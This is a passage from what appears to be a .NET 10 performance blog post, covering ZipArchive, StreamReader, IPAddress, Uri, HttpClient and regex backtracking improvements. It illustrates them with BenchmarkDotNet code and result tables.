<td>104.3 us</td> <td>0.31</td> </tr> </tbody> </table><p>Other components that sit above these streams, like <code>ZipArchive</code>, have also improved. <a href="https://github.com/dotnet/runtime/pull/103153">dotnet/runtime#103153</a> from <a href="https://github.com/edwardneal">@edwardneal</a> updates <code>ZipArchive</code> to not rely on <code>BinaryReader</code> and <code>BinaryWriter</code>, avoiding their underlying buffer allocations and having more fine-grained control over how and when exactly data is encoded/decoded and written/read. And <a href="https://github.com/dotnet/runtime/pull/102704">dotnet/runtime#102704</a> from <a href="https://github.com/edwardneal">@edwardneal</a> reduces memory consumption and allocation when updating <code>ZipArchive</code>s. A <code>ZipArchive</code> update used to be &ldquo;rewrite the world&rdquo;: it loaded every entry&rsquo;s data into memory and rewrote all the file headers, all entry data, and the &ldquo;central directory&rdquo; (what the zip format calls its catalog of all the entries in the archive). A large archive would have proportionally large allocation. This PR introduces change tracking plus ordering of entries so that only the portion of the file from the first actually affected entry (or one whose variable&#8209;length metadata/data changed) is rewritten, rather than always rewriting the whole thing. The effects can be significant.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.IO.Compression; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private Stream _zip = new MemoryStream(); [GlobalSetup] public void Setup() { using ZipArchive zip = new(_zip, ZipArchiveMode.Create, leaveOpen: true); Random r = new(42); for (int i = 0; i &lt; 1000; i++) { byte[] fileBytes = new byte[r.Next(512, 2048)]; r.NextBytes(fileBytes); using Stream s = zip.CreateEntry($"file{i}.txt").Open(); s.Write(fileBytes); } } [Benchmark] public void Update() { _zip.Position = 0; using ZipArchive zip = new(_zip, ZipArchiveMode.Update, leaveOpen: true); zip.GetEntry("file987.txt")?.Delete(); } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Update</td> <td>.NET 9.0</td> <td>987.8 us</td> <td>1.00</td> <td>2173.9 KB</td> <td>1.00</td> </tr> <tr> <td>Update</td> <td>.NET 10.0</td> <td>354.7 us</td> <td>0.36</td> <td>682.22 KB</td> <td>0.31</td> </tr> </tbody> </table><p>(<code>ZipArchive</code> and <code>ZipFile</code> also gain async APIs in <a href="https://github.com/dotnet/runtime/pull/114421">dotnet/runtime#114421</a>, a long requested feature that allows using async I/O while loading, manipulating, and saving zips.)</p><p>Finally, somewhere between performance and reliability, <a href="https://github.com/dotnet/roslyn-analyzers/pull/7390">dotnet/roslyn-analyzers#7390</a> from <a href="https://github.com/mpidash">@mpidash</a> adds a new analyzer for <code>StreamReader.EndOfStream</code>. <code>StreamReader.EndOfStream</code> seems like it should be harmless, but it&rsquo;s quite the devious little property. The intent is to determine whether the reader is at the end up of the underlying <code>Stream</code>. Seems easy enough. If the <code>StreamReader</code> still has previously read data buffered, obviously it&rsquo;s not at the end. And if the reader has previously seen EOF, e.g. <code>Read</code> returned <code>0</code>, then it obviously is at the end. But in all other situations, there&rsquo;s no way to know you&rsquo;re at the end of the stream (at least in the general case) without performing a read, which means this property does something properties should never do: perform I/O. Worse than just performing I/O, that read can be a blocking operation, e.g. if the <code>Stream</code> represents a network stream for a <code>Socket</code>, and performing a read actually means blocking until data is received. Even worse, though, is when it&rsquo;s used in an asynchronous method, e.g.</p><pre><code>while (!reader.EndOfStream) { string? line = await reader.ReadLineAsync(); ... }</code></pre><p>Now not only might <code>EndOfStream</code> do I/O and block, it&rsquo;s doing that in a method that&rsquo;s supposed to do all of its waiting asynchronously.</p><p>What makes this even more frustrating is that <code>EndOfStream</code> isn&rsquo;t even useful in a loop like that above. <code>ReadLineAsync</code> will return a <code>null</code> string if it&rsquo;s at the end of the stream, so the loop would instead be better as:</p><pre><code>while (await reader.ReadLineAsync() is string line) { ... }</code></pre><p>Simpler, cheaper, and no ticking time bombs of synchronous I/O. Thanks to this new analyzer, any such use of <code>EndOfStream</code> in an async method will trigger <code>CA2024</code>:</p><h2>Networking</h2><p>Networking-related operations show up in almost every modern workload. Past releases of .NET have seen a lot of energy exerted on whittling away at networking overheads, as these components are used over and over and over, often in critical paths, and the overheads can add up. .NET 10 continues the streamlining trend.</p><p>As was seen with core primitives earlier, <code>IPAddress</code> and <code>IPNetwork</code> are both imbued with UTF8 parsing capabilities, thanks to <a href="https://github.com/dotnet/runtime/pull/102144">dotnet/runtime#102144</a> from <a href="https://github.com/edwardneal">@edwardneal</a>. As is the case with most other such types in the core libraries, the UTF8-based implementation and the UTF16-based implementation are mostly the same implementation, sharing most of their code via generic methods parameterized on <code>byte</code> vs <code>char</code>. And as a result of the focus on enabling UTF8, not only can you parse UTF8 bytes directly rather than needing to transcode first, the existing code actually gets a bit faster.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Net; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "s")] public partial class Tests { [Benchmark] [Arguments("Fe08::1%13542")] public IPAddress Parse(string s) =&gt; IPAddress.Parse(s); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Parse</td> <td>.NET 9.0</td> <td>71.35 ns</td> <td>1.00</td> </tr> <tr> <td>Parse</td> <td>.NET 10.0</td> <td>54.60 ns</td> <td>0.77</td> </tr> </tbody> </table><p><code>IPAddress</code> is also imbued with <code>IsValid</code> and <code>IsValidUtf8</code> methods, thanks to <a href="https://github.com/dotnet/runtime/pull/111433">dotnet/runtime#111433</a>. It was previously possible to test the validity of an address via <code>TryParse</code>, but when successful, that would allocate the <code>IPAddress</code>; if you don&rsquo;t need the resulting object but just need to know whether it&rsquo;s valid, the extra allocation is wasteful.</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Net; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private string _address = "123.123.123.123"; [Benchmark(Baseline = true)] public bool TryParse() =&gt; IPAddress.TryParse(_address, out _); [Benchmark] public bool IsValid() =&gt; IPAddress.IsValid(_address); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>TryParse</td> <td>26.26 ns</td> <td>1.00</td> <td>40 B</td> <td>1.00</td> </tr> <tr> <td>IsValid</td> <td>21.88 ns</td> <td>0.83</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p><code>Uri</code>, used in the above benchmark, also gets some notable improvements. In fact, one of my favorite improvements in all of .NET 10 is in <code>Uri</code>. The feature itself isn&rsquo;t a performance improvement, but there are some interesting performance-related ramifications for it. In particular, since forever, <code>Uri</code> has had a length limitation due to implementation details. <code>Uri</code> keeps track of various offsets in the input, such as where the host portion starts, where the path starts, where the query starts, and so on. The implementer chose to use <code>ushort</code> for each of these values rather than <code>int</code>. That means the maximum length of a <code>Uri</code> is then constrained to the lengths a <code>ushort</code> can describe, namely 65,535 characters. That sounds like a ridiculously long <code>Uri</code>, one no one would ever need to go beyond&hellip; until you consider data URIs. Data URIs embed a representation of arbitrary bytes, typically Base64 encoded, in the URI itself. This allows for files to be represented directly in links, and it&rsquo;s become a common way for AI-related services to send and receive data payloads, like images. It doesn&rsquo;t take a very large image to exceed 65K characters, however, especially with Base64 encoding increasing the payload size by ~33%. <a href="https://github.com/dotnet/runtime/pull/117287">dotnet/runtime#117287</a> finally removes that limitation, so now <code>Uri</code> can be used to represent very large data URIs, if desired. This, however, has some performance ramifications (beyond the few percentage increase in the size of <code>Uri</code>, to accomodate the extra <code>ushort</code> to <code>int</code> bytes). In particular, <code>Uri</code> implements path compression, so for example this:</p><pre><code>Console.WriteLine(new Uri("http://test/hello/../hello/../hello"));</code></pre><p>prints out:</p><pre><code>http://test/hello</code></pre><p>As it turns out, the algorithm implementing that path compression is <code>O(N^2)</code>. Oops. With a limit of 65K characters, such a quadratic complexity isn&rsquo;t a security concern (as <code>O(N^2)</code> operations can sometimes be, as if <code>N</code> is unbounded, it creates an attack vector where an attacker can do <code>N</code> work and get the attackee to do disproportionately more). But once the limit is removed entirely, it could be. As such, <a href="https://github.com/dotnet/runtime/pull/117820">dotnet/runtime#117820</a> compensates by making the path compression <code>O(N)</code>. And while in the general case, we don&rsquo;t expect path compression to be a meaningfully impactful part of constructing <code>Uri</code>, in degenerate cases, even under the old limit, the change can still make a measurable improvement.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private string _input = $"http://host/{string.Concat(Enumerable.Repeat("a/../", 10_000))}{new string('a', 10_000)}"; [Benchmark] public Uri Ctor() =&gt; new Uri(_input); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Ctor</td> <td>.NET 9.0</td> <td>18.989 us</td> <td>1.00</td> </tr> <tr> <td>Ctor</td> <td>.NET 10.0</td> <td>2.228 us</td> <td>0.12</td> </tr> </tbody> </table><p>In the same vein, the longer the URI, the more effort is required to do whatever validation is needed in the constructor. <code>Uri</code>&lsquo;s constructor needs to check whether the input has any Unicode characters that might need to be handled. Rather than checking all the characters one at a time, with <a href="https://github.com/dotnet/runtime/pull/107357">dotnet/runtime#107357</a>, <code>Uri</code> can now use <code>SearchValues</code> to more quickly rule out or find the first location of a character that needs to be looked at more deeply.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private string _uri; [GlobalSetup] public void Setup() { byte[] bytes = new byte[40_000]; new Random(42).NextBytes(bytes); _uri = $"data:application/octet-stream;base64,{Convert.ToBase64String(bytes)}"; } [Benchmark] public Uri Ctor() =&gt; new Uri(_uri); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Ctor</td> <td>.NET 9.0</td> <td>19.354 us</td> <td>1.00</td> </tr> <tr> <td>Ctor</td> <td>.NET 10.0</td> <td>2.041 us</td> <td>0.11</td> </tr> </tbody> </table><p>Other changes were made to <code>Uri</code> that further reduce construction costs in various other cases, too. For cases where the URI host is an IPv6 address, e.g. <code>http://[2603:1020:201:10::10f]</code>, <a href="https://github.com/dotnet/runtime/pull/117292">dotnet/runtime#117292</a> recognizes that scope IDs are relatively rare and makes the cases without a scope ID cheaper in exchange for making the cases with a scope ID a little more expensive.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public string CtorHost() =&gt; new Uri("http://[2603:1020:201:10::10f]").Host; }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>CtorHost</td> <td>.NET 9.0</td> <td>304.9 ns</td> <td>1.00</td> <td>208 B</td> <td>1.00</td> </tr> <tr> <td>CtorHost</td> <td>.NET 10.0</td> <td>254.2 ns</td> <td>0.83</td> <td>216 B</td> <td>1.04</td> </tr> </tbody> </table><p>(Note that the .NET 10 allocation is 8 bytes larger than the .NET 9 allocation due to the extra space required in this case for dropping the length limitation, as discussed earlier.)</p><p><a href="https://github.com/dotnet/runtime/pull/117289">dotnet/runtime#117289</a> also improves construction for cases where the URI requires normalization, saving some allocations by using normalization routines over spans (which were added in <a href="https://github.com/dotnet/runtime/pull/110465">dotnet/runtime#110465</a>) instead of needing to allocate <code>string</code>s for the inputs.</p><pre><code>using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public Uri Ctor() =&gt; new("http://some.host.with.&uuml;mlauts/"); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Ctor</td> <td>.NET 9.0</td> <td>377.6 ns</td> <td>1.00</td> <td>440 B</td> <td>1.00</td> </tr> <tr> <td>Ctor</td> <td>.NET 10.0</td> <td>322.0 ns</td> <td>0.85</td> <td>376 B</td> <td>0.85</td> </tr> </tbody> </table><p>Various improvements have also found their way into the HTTP stack. For starters, the download helpers on <code>HttpClient</code> and <code>HttpContent</code> have improved. These types expose helper methods for some of the most common forms of grabbing data; while a developer can grab the response <code>Stream</code> and consume that efficiently, for simple and common cases like &ldquo;just get the whole response as a <code>string</code>&rdquo; or &ldquo;just get the whole response as a <code>byte[]</code>&ldquo;, the <code>GetStringAsync</code> and <code>GetByteArrayAsync</code> make that really easy to do. <a href="https://github.com/dotnet/runtime/pull/109642">dotnet/runtime#109642</a> changes how these methods operate in order to better manage the temporary buffers that are required, especially in the case where the server hasn&rsquo;t advertised a <code>Content-Length</code>, such that the client doesn&rsquo;t know ahead of time how much data to expect and thus how much space to allocate.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Net; using System.Net.Sockets; using System.Text; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private HttpClient _client = new(); private Uri _uri; [GlobalSetup] public void Setup() { Socket listener = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); listener.Bind(new IPEndPoint(IPAddress.Loopback, 0)); listener.Listen(int.MaxValue); _ = Task.Run(async () =&gt; { byte[] header = "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n"u8.ToArray(); byte[] chunkData = Enumerable.Range(0, 100).SelectMany(_ =&gt; "abcdefghijklmnopqrstuvwxyz").Select(c =&gt; (byte)c).ToArray(); byte[] chunkHeader = Encoding.UTF8.GetBytes($"{chunkData.Length:X}\r\n"); byte[] chunkFooter = "\r\n"u8.ToArray(); byte[] footer = "0\r\n\r\n"u8.ToArray(); while (true) { var server = await listener.AcceptAsync(); server.NoDelay = true; using StreamReader reader = new(new NetworkStream(server), Encoding.ASCII); while (true) { while (!string.IsNullOrEmpty(await reader.ReadLineAsync())) ; await server.SendAsync(header); for (int i = 0; i &lt; 100; i++) { await server.SendAsync(chunkHeader); await server.SendAsync(chunkData); await server.SendAsync(chunkFooter); } await server.SendAsync(footer); } } }); var ep = (IPEndPoint)listener.LocalEndPoint!; _uri = new Uri($"http://{ep.Address}:{ep.Port}/"); } [Benchmark] public async Task<byte> ResponseContentRead_ReadAsByteArrayAsync() { using HttpResponseMessage resp = await _client.GetAsync(_uri); return await resp.Content.ReadAsByteArrayAsync(); } [Benchmark] public async Task<string> ResponseHeadersRead_ReadAsStringAsync() { using HttpResponseMessage resp = await _client.GetAsync(_uri, HttpCompletionOption.ResponseHeadersRead); return await resp.Content.ReadAsStringAsync(); } }</string></byte></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>ResponseContentRead_ReadAsByteArrayAsync</td> <td>.NET 9.0</td> <td>1.438 ms</td> <td>1.00</td> <td>912.71 KB</td> <td>1.00</td> </tr> <tr> <td>ResponseContentRead_ReadAsByteArrayAsync</td> <td>.NET 10.0</td> <td>1.166 ms</td> <td>0.81</td> <td>519.12 KB</td> <td>0.57</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>ResponseHeadersRead_ReadAsStringAsync</td> <td>.NET 9.0</td> <td>1.528 ms</td> <td>1.00</td> <td>1166.77 KB</td> <td>1.00</td> </tr> <tr> <td>ResponseHeadersRead_ReadAsStringAsync</td> <td>.NET 10.0</td> <td>1.306 ms</td> <td>0.86</td> <td>773.3 KB</td> <td>0.66</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/117071">dotnet/runtime#117071</a> reduces overheads associated with HTTP header validation. In the <code>System.Net.Http</code> implementation, some headers have dedicated parsers for them, while many (the majority of custom ones that services define) don&rsquo;t. This PR recognizes that for these, the validation that needs to be performed amounts to only checking for forbidden newline characters, and the objects that were being created for all headers weren&rsquo;t necessary for these.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Net.Http.Headers; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private readonly HttpResponseHeaders _headers = new HttpResponseMessage().Headers; [Benchmark] public void Add() { _headers.Clear(); _headers.Add("X-Custom", "Value"); } [Benchmark] public object GetValues() { _headers.Clear(); _headers.TryAddWithoutValidation("X-Custom", "Value"); return _headers.GetValues("X-Custom"); } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Add</td> <td>.NET 9.0</td> <td>28.04 ns</td> <td>1.00</td> <td>32 B</td> <td>1.00</td> </tr> <tr> <td>Add</td> <td>.NET 10.0</td> <td>12.61 ns</td> <td>0.45</td> <td>&ndash;</td> <td>0.00</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>GetValues</td> <td>.NET 9.0</td> <td>82.57 ns</td> <td>1.00</td> <td>64 B</td> <td>1.00</td> </tr> <tr> <td>GetValues</td> <td>.NET 10.0</td> <td>23.97 ns</td> <td>0.29</td> <td>32 B</td> <td>0.50</td> </tr> </tbody> </table><p>For folks using HTTP/2, <a href="https://github.com/dotnet/runtime/pull/112719">dotnet/runtime#112719</a> decreases per-connection memory consumption, by changing the <code>HPackDecoder</code> to lazily grow its buffers, starting from expected-case sizing rather than worst-case. (&ldquo;HPACK&rdquo; is the header compression algorithm used by HTTP/2, utilizing a table shared between client and server for managing commonly transmitted headers.) It&rsquo;s a little hard to measure in a micro-benchmark, since in a real app the connections get reused (and the benefits here aren&rsquo;t about temporary allocation but rather connection density and overall working set), but we can get a glimpse of it by doing what you&rsquo;re not supposed to do and create a new <code>HttpClient</code> for each request (you&rsquo;re not supposed to do that, or more specifically not supposed to create a new handler for each request, because doing so tears down the connection pool and the connections it contains&hellip; which is bad for an app but exactly what we want for our micro-benchmark).</p><pre><code>// For this benchmark, change the benchmark.csproj to start with: //<project> // instead of: //<project> // dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using System.Net; using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using Microsoft.AspNetCore.Server.Kestrel.Core; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private WebApplication _app; [GlobalSetup] public async Task Setup() { var builder = WebApplication.CreateBuilder(); builder.Logging.SetMinimumLevel(LogLevel.Warning); builder.WebHost.ConfigureKestrel(o =&gt; o.ListenLocalhost(5000, listen =&gt; listen.Protocols = HttpProtocols.Http2)); _app = builder.Build(); _app.MapGet("/hello", () =&gt; Results.Text("hi from kestrel over h2c\n")); var serverTask = _app.RunAsync(); await Task.Delay(300); } [GlobalCleanup] public async Task Cleanup() { await _app.StopAsync(); await _app.DisposeAsync(); } [Benchmark] public async Task Get() { using var client = new HttpClient() { DefaultRequestVersion = HttpVersion.Version20, DefaultVersionPolicy = HttpVersionPolicy.RequestVersionExact }; var response = await client.GetAsync("http://localhost:5000/hello"); } }</project></project></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Get</td> <td>.NET 9.0</td> <td>485.9 us</td> <td>1.00</td> <td>83.19 KB</td> <td>1.00</td> </tr> <tr> <td>Get</td> <td>.NET 10.0</td> <td>445.0 us</td> <td>0.92</td> <td>51.79 KB</td> <td>0.62</td> </tr> </tbody> </table><p>Also, on Linux and macOS, all HTTP use (and, more generally, all socket interactions) gets a tad cheaper from <a href="https://github.com/dotnet/runtime/pull/109052">dotnet/runtime#109052</a>, which eliminates a <code>ConcurrentDictionary&lt;&gt;</code> lookup for each asynchronous operation that completes on a <code>Socket</code>.</p><p>And for all you Native AOT fans, <a href="https://github.com/dotnet/runtime/pull/117012">dotnet/runtime#117012</a> also adds a feature switch that enables trimming out the HTTP/3 implementation from <code>HttpClient</code>, which can represent a very sizeable and &ldquo;free&rdquo; space savings if you&rsquo;re not using HTTP/3 at all.</p><h2>Searching</h2><p>Someone once told me that computer science was &ldquo;all about sorting and searching.&rdquo; That&rsquo;s not far off. Searching in one way, shape, or form is an integral part of many applications and services.</p><h3>Regex</h3><p>Whether you love or hate the terse syntax, regular expressions (regex) continue to be an integral part of software development, with applications as part of both software and the software development process. As such, it&rsquo;s had robust support in .NET since the early days of the platform, with the <code>System.Text.RegularExpressions</code> namespace providing a feature-rich set of regex capabilities. The performance of <code>Regex</code> was improved significantly in .NET 5 (<a href="https://devblogs.microsoft.com/dotnet/regex-performance-improvements-in-net-5/">Regex Performance Improvements in .NET 5</a>) and then again in .NET 7, which also saw a significant amount of new functionality added (<a href="https://devblogs.microsoft.com/dotnet/regular-expression-improvements-in-dotnet-7/">Regular Expression Improvements in .NET 7</a>). It&rsquo;s continued to be improved in every release since, and .NET 10 is no exception.</p><p>As I&rsquo;ve discussed in previous blog posts about regex and performance, there are two high-level ways regex engines are implemented, either with backtracking or without. Non-backtracking engines typically work by creating some form of finite automata that represents the pattern, and then for each character consumed from the input, moves around the deterministic finite automata (DFA, meaning you can be in only a single state at a time) or non-deterministic finite automata (NFA, meaning you can be in multiple states at a time), transitioning from one state to another. A key benefit of a non-backtracking engine is that it can often make linear guarantees about processing time, where an input string of length <code>N</code> can be processed in worst-case <code>O(N)</code> time. A key downside of a non-backtracking engine is it can&rsquo;t support all of the features developers are familiar with in modern regex engines, like back references. Backtracking engines are named as such because they&rsquo;re able to &ldquo;backtrack,&rdquo; trying one approach to see if there&rsquo;s a match and then going back and trying another. If you have the regex pattern <code>\w*\d</code> (which matches any number of word characters followed by a single digit) and supply it with the string <code>"12"</code>, a backtracking engine is likely to first try treating both the <code>'1'</code> and the <code>'2'</code> as word characters, then find that it doesn&rsquo;t have anything to fulfill the <code>\d</code>, and thus backtrack, instead treating only the <code>'1'</code> as being consumed by the <code>\w*</code>, and leaving the <code>'2'</code> to be consumed by the <code>\d</code>. Backtracking is how engines support features like back references, variable-length lookarounds, conditional expressions, and more. They can also have excellent performance, especially on the average and best cases. A key downside, however, is their worst case, where on some patterns they can suffer from &ldquo;catastrophic backtracking.&rdquo; That happens when all of that backtracking leads to exploring the same input over and over and over again, possibly consuming much more than linear time.</p><p>Since .NET 7, .NET has had an opt-in non-backtracking engine, which is what you get with <code>RegexOptions.NonBacktracking</code>, Otherwise, it uses a backtracking engine, whether using the default interpreter, or a regex compiled to IL (<code>RegexOptions.Compiled</code>), or a regex emitted as a custom C# implementation with the regex source generator (<code>[GeneratedRegex(...)]</code>). These backtracking engines can yield exceptional performance, but due to their backtracking nature, they are susceptible to bad worst-case performance, which is why specifying timeouts to a <code>Regex</code> is often encouraged, especially when using patterns of unknown provenance. Still, there are things backtracking engines can do to help mitigate some such backtracking, in particular avoiding the need for some of the backtracking in the first place.</p><p>One of the main tools backtracking engines offer for reduced backtracking is an &ldquo;atomic&rdquo; construct. Some regex syntaxes surface this via &ldquo;possessive quantifiers,&rdquo; while others, including .NET, surface it via &ldquo;atomic groups.&rdquo; They&rsquo;re fundamentally the same thing, just expressed in the syntax differently. An atomic group in .NET&rsquo;s regex syntax is a group that is never backtracked into. If we take our previous <code>\w*\d</code> example, we could wrap the <code>\w*</code> loop in an atomic group like this: <code>(?&gt;\w*)\d</code>. In doing so, whatever that <code>\w*</code> consumes won&rsquo;t change via backtracking after exiting the group and moving on to whatever comes after it in the pattern. So if I try to match <code>"12"</code> with such a pattern, it&rsquo;ll fail, because the <code>\w*</code> will consume both characters, the <code>\d</code> will have nothing to match, and no backtracking will be applied, because the <code>\w*</code> is wrapped in an atomic group and thus exposes no backtracking opportunities.</p><p>In that example, wrapping the <code>\w*</code> with an atomic group changes the meaning of the pattern, and thus it&rsquo;s not something that a regex engine could choose to do automatically. However, there are many cases where wrapping otherwise backtracking constructs in an atomic group does not observably change behavior, because any backtracking that would otherwise happen would provably never be fruitful. Consider a pattern <code>a*b</code>. <code>a*b</code> is observably identical to <code>(?&gt;a*)b</code>, which says that the <code>a*</code> should not be backtracked into. That&rsquo;s because there&rsquo;s nothing the <code>a*</code> can &ldquo;give back&rdquo; (which can only be <code>a</code>s) that would satisfy what comes next in the pattern (which is only <code>b</code>). It&rsquo;s thus valid for a backtracking engine to transform how it processes <code>a*b</code> to instead be the equivalent of how it processes <code>(?&gt;a*)b</code>. And the .NET regex engine has been capable of such transformations since .NET 5. This can result in massive improvements to throughput. With backtracking, waving my hands, we effectively need to execute everything after the backtracking construct for each possible position we could backtrack to. So, for example, with <code>\w*SOMEPATTERN</code>, if the <code>w*</code> successfully initially consumes 100 characters, we then possibly need to try to match <code>SOMEPATTERN</code> up to 100 different times, as we may need to backtrack up to 100 times and re-evaluate <code>SOMEPATTERN</code> each time we give back one of the things initially matched. If we instead make that <code>(?&gt;\w*)</code>, we eliminate all but one of those! That makes improvements to this ability to automatically transform backtracking constructs to be non-backtracking possibly massive improvements in performance, and practically every release of .NET since .NET 5 has increased the set of patterns that are automatically transformed. .NET 10 included.</p><p>Let&rsquo;s start with <a href="https://github.com/dotnet/runtime/pull/117869">dotnet/runtime#117869</a>, which teaches the regex optimizer about more &ldquo;disjoint&rdquo; sets. Consider the previous example of <code>a*b</code>, and how I said we can make that <code>a*</code> loop atomic because there&rsquo;s nothing <code>a*</code> can &ldquo;give back&rdquo; that matches <code>b</code>. That is a general statement about auto-atomicity: a loop can be made atomic if it&rsquo;s guaranteed to end with something that can&rsquo;t possibly match the thing that comes after it. So, if I have <code>[abc]+[def]</code>, that loop can be made atomic, because there&rsquo;s nothing <code>[abc]</code> can match that <code>[def]</code> can also match. In contrast, if the expression were instead <code>[abc]+[cef]</code>, that loop must not be made atomic automatically, as doing so could change behavior. The sets <em>do</em> overlap, as both can match <code>'c'</code>. So, for example, if the input were just <code>"cc"</code>, the original expression should match it (the <code>[abc]*</code> loop would match <code>'c'</code> with one iteration of the loop and then the second <code>'c'</code> would satisfy the <code>[cef]</code> set), but if the expression were instead <code>(?&gt;[abc]+)[cef]</code>, it would no longer match, as the <code>[abc]+</code> would consume both <code>'c'</code>s, and there&rsquo;d be nothing left for the <code>[cef]</code> set to match. Two sets that don&rsquo;t have any overlap are referred to as being &ldquo;disjoint,&rdquo; and so the optimizer needs to be able to prove the disjointedness of sets in order to perform these kinds of auto-atomicity optimizations. The optimizer was already able to do so for many sets, in particular ones that were composed purely of characters or character ranges, e.g. <code>[ace]</code> or <code>[a-zA-Z0-9]</code>. But many sets are instead composed of entire Unicode categories. For example, when you write <code>\d</code>, unless you&rsquo;ve specified <code>RegexOptions.ECMAScript</code> that&rsquo;s the same as <code>\p{Nd}</code>, which says &ldquo;match any character in the Unicode category of Number decimal digits&rdquo;, aka all characters for which <code>char.GetUnicodeCategory</code> returns <code>UnicodeCategory.DecimalDigitNumber</code>. And the optimizer was unable to reason about overlap between such sets. So, for example, if you had the expression <code>\w*\p{Sm}</code>, that matches anything that&rsquo;s any number of word characters followed by a math symbol (<code>UnicodeCategory.MathSymbol</code>). <code>\w</code> is actually just a set of eight specific Unicode categories, such that the previous expression behaves identically to if I&rsquo;d written <code>[\p{Ll}\p{Lu}\p{Lt}\p{Lm}\p{Lo}\p{Mn}\p{Nd}\p{Pc}]*\p{Sm}</code> (<code>\w</code> is composed of <code>UnicodeCategory.UppercaseLetter</code>, <code>UnicodeCategory.LowercaseLetter</code>, <code>UnicodeCategory.TitlecaseLetter</code>, <code>UnicodeCategory.ModiferLetter</code>, <code>UnicodeCategory.OtherLetter</code>, <code>UnicodeCategory.NonSpacingMark</code>, 